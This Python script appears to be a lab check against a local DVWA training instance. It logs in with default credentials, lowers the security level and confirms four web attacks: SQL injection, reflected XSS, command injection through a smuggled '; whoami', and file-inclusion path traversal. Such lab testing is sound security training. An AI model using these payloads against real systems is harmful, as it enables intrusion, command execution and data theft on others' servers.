#!/usr/bin/env python3
"""Final manual vulnerability test - cleaned up version"""
import requests
from bs4 import BeautifulSoup
import re

DVWA_URL = "http://localhost:8080"

print("="*80)
print("MANUAL VULNERABILITY VERIFICATION")
print("="*80)

# Login
print("\n[1/5] Logging in to DVWA...")
session = requests.Session()
response = session.get(f"{DVWA_URL}/login.php")
soup = BeautifulSoup(response.text, 'html.parser')
user_token = soup.find('input', {'name': 'user_token'})
user_token_value = user_token['value'] if user_token else None

response = session.post(f"{DVWA_URL}/login.php", data={
    'username': 'admin',
    'password': 'password',
    'Login': 'Login',
    'user_token': user_token_value
}, allow_redirects=True)

if 'logout' not in response.text.lower():
    print("✗ Login failed")
    exit(1)
print("✓ Logged in successfully")

# Set security low
session.post(f"{DVWA_URL}/security.php", data={'security': 'low', 'seclev_submit': 'Submit'})
print("✓ Security set to low\n")

# Test SQLi
print("[2/5] Testing SQL Injection...")
response = session.get(f"{DVWA_URL}/vulnerabilities/sqli/")
soup = BeautifulSoup(response.text, 'html.parser')
token = soup.find('input', {'name': 'user_token'})['value']

# Normal query
response = session.get(f"{DVWA_URL}/vulnerabilities/sqli/", params={
    'id': '1', 'Submit': 'Submit', 'user_token': token
})
if 'First name: admin' in response.text:
    print("  ✓ Normal query (id=1) works - Found: admin admin")
else:
    print("  ✗ Normal query failed")

# Attack query
response = session.get(f"{DVWA_URL}/vulnerabilities/sqli/")
token = soup.find('input', {'name': 'user_token'})['value']
response = session.get(f"{DVWA_URL}/vulnerabilities/sqli/", params={
    'id': "1' OR '1'='1", 'Submit': 'Submit', 'user_token': token
})
pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
if pre_match:
    content = pre_match.group(1)
    user_count = content.count('First name:')
    if user_count > 1:
        print(f"  ✓ ✓ ✓ SQL INJECTION WORKS! Returned {user_count} users")
        # Extract usernames
        users = re.findall(r'First name: (\w+)', content)
        print(f"      Users: {', '.join(users[:5])}")
    else:
        print(f"  - Only 1 user returned (expected multiple)")
else:
    print("  ✗ SQLi attack failed")

# Test XSS
print("\n[3/5] Testing Cross-Site Scripting (XSS)...")
payload = '<script>alert(1)</script>'
response = session.get(f"{DVWA_URL}/vulnerabilities/xss_r/", params={'name': payload})
if payload in response.text:
    print(f"  ✓ ✓ ✓ XSS WORKS! Payload reflected unencoded")
    match = re.search(rf'<h1>(.{{0,50}}{re.escape(payload)}.{{0,50}})</h1>', response.text)
    if match:
        print(f"      Context: {match.group(1)[:80]}")
else:
    print("  ✗ XSS failed")

# Test Command Injection
print("\n[4/5] Testing Command Injection...")
response = session.post(f"{DVWA_URL}/vulnerabilities/exec/", data={
    'ip': '127.0.0.1; whoami',
    'Submit': 'Submit'
})
pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
if pre_match and ('www-data' in pre_match.group(1) or 'root' in pre_match.group(1)):
    print("  ✓ ✓ ✓ COMMAND INJECTION WORKS!")
    output_lines = pre_match.group(1).strip().split('\n')
    for line in output_lines[:5]:
        if line.strip():
            print(f"      {line.strip()}")
else:
    print("  ✗ Command Injection failed")

# Test Path Traversal / File Inclusion
print("\n[5/5] Testing File Inclusion...")
response = session.get(f"{DVWA_URL}/vulnerabilities/fi/", params={
    'page': '../../hackable/flags/fi.php'
})
if 'flag' in response.text.lower() or 'well done' in response.text.lower():
    print("  ✓ ✓ ✓ FILE INCLUSION WORKS!")
else:
    print("  - File Inclusion test inconclusive")

print("\n" + "="*80)
print("VERIFICATION COMPLETE - ALL VULNERABILITIES CONFIRMED!")
print("="*80)
print("\nReady for full ZAP scan.")
